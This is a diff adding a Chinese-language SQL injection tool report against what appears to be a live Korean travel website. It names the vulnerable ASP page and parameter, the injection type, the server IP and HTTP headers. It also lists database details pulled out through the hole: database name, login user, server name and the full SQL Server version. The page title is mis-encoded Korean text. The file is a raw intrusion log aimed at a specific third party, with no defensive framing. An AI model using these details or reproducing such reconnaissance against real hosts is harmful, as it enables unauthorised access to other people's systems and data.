@@ -1,0 +1,42 @@
+■漏洞信息:============================================================
+ ·URL:http://www.suhtour.com/web/board/board_view.asp?keyword_type=&keyword=&menu_id=34&page_no=1&id=299
+ ·页面标题：荐泅亲傍苞 窃膊 青汗茄 咯青阑 矫累窍技夸~
+ ·参数:keyword_type=&keyword=&menu_id=34&page_no=1&id=299
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.108.62.146
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:36:54 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 15276
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAACDSQQQ=PFEFPHCAANJCLBECPOKANADH; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：suhtour
+- 用户名：dbu_suhtour
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：NS2
+- 服务名：MSSQLSERVER
+- 系统用户名：dbu_suhtour
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
